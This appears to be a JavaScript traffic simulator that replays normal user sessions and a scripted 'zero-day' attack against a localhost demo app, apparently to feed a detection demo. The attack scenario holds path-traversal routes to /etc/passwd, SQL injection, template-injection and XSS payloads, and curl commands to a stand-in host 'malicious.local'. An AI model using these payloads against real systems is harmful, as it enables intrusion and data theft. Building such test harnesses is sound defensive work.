const http = require("http");

const scenarios = {
  normal: [
    { sessionId: "user-alice", role: "guest", steps: ["/demo/login", "/demo/products", "/demo/cart", "/demo/profile"] },
    { sessionId: "user-bob", role: "guest", steps: ["/demo/login", "/demo/products", "/demo/profile", "/demo/products", "/demo/cart"] },
    { sessionId: "user-ops", role: "admin", steps: ["/demo/login", "/demo/admin", "/demo/api/export", "/demo/profile"] }
  ],
  attack: [
    {
      sessionId: "intruder-zero-day",
      role: "guest",
      steps: [
        "/demo/login",
        "/demo/debug?next=../../etc/passwd",
        "/demo/internal",
        "/demo/api/export",
        "/demo/api/users/delete?id=1%27%20or%20%271%27=%271",
        "/demo/admin"
      ]
    }
  ]
};

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function sendRequest({ route, sessionId, role, payload, host, port, mode }) {
  const body = payload ? JSON.stringify(payload) : "";

  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        host,
        port,
        path: route,
        method: body ? "POST" : "GET",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body),
          "X-Session-Id": sessionId,
          "X-Demo-Role": role,
          "User-Agent": mode === "attack" ? "zero-day-simulator/1.0" : "normal-browser/1.0"
        }
      },
      (res) => {
        let responseBody = "";
        res.on("data", (chunk) => {
          responseBody += chunk;
        });
        res.on("end", () => {
          let parsed = {};
          try {
            parsed = JSON.parse(responseBody || "{}");
          } catch {
            parsed = { raw: responseBody };
          }
          resolve({ status: res.statusCode, route, body: parsed });
        });
      }
    );

    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

async function runNormalScenario({ host = "localhost", port = 3000, onEvent = () => {} } = {}) {
  for (let round = 0; round < 4; round += 1) {
    for (const scenario of scenarios.normal) {
      for (const route of scenario.steps) {
        const result = await sendRequest({
          route,
          sessionId: scenario.sessionId,
          role: scenario.role,
          payload: route === "/demo/cart" ? { productId: "router-12", quantity: 1 } : null,
          host,
          port,
          mode: "normal"
        });
        onEvent({ mode: "normal", sessionId: scenario.sessionId, route, result });
        await wait(250 + Math.floor(Math.random() * 300));
      }
    }
  }
}

async function runAttackScenario({ host = "localhost", port = 3000, onEvent = () => {} } = {}) {
  const scenario = scenarios.attack[0];

  for (const route of scenario.steps) {
    const result = await sendRequest({
      route,
      sessionId: scenario.sessionId,
      role: scenario.role,
      payload: {
        probe: "' OR '1'='1 --",
        template: "${{constructor.constructor('return process')()}}",
        blob: "A".repeat(180) + "<script>alert(1)</script>"
      },
      host,
      port,
      mode: "attack"
    });

    onEvent({ mode: "attack", sessionId: scenario.sessionId, route, result });
    await wait(40);
  }

  for (let i = 0; i < 30; i += 1) {
    const route = `/demo/internal?scan=${i}&path=../secret/${i}`;
    const result = await sendRequest({
      route,
      sessionId: scenario.sessionId,
      role: scenario.role,
      payload: { command: `curl http://malicious.local/${i}`, idx: i },
      host,
      port,
      mode: "attack"
    });

    onEvent({ mode: "burst", sessionId: scenario.sessionId, route, result });
    await wait(20);
  }
}

async function runScenario(mode, options = {}) {
  if (mode === "normal") {
    await runNormalScenario(options);
    return;
  }

  if (mode === "attack") {
    await runAttackScenario(options);
    return;
  }

  throw new Error("Unknown simulation mode. Use normal or attack.");
}

module.exports = {
  runScenario,
  runNormalScenario,
  runAttackScenario
};
